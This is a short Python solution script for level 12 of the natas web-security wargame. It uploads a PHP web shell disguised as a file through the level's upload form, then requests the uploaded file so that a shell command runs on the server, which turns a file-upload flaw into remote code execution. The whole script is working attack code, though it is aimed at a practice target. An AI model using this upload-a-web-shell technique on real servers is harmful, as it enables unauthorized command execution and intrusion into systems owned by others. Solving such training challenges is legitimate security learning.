from natas import Natas
import io


natas = Natas('natas12')

script = b'''
    $output = shell_exec('ls -la 2>&1');
    print $output;
'''

f = io.BytesIO(b'<?php\n' + script)  # execute any script on the server

post = {'filename': 'dupa.php'}
files = {'uploadedfile': f}

resp = natas.get_response(data=post, files=files)

href = resp.a.get('href')

resp = natas.get_response(relative_url=href)

print(resp)
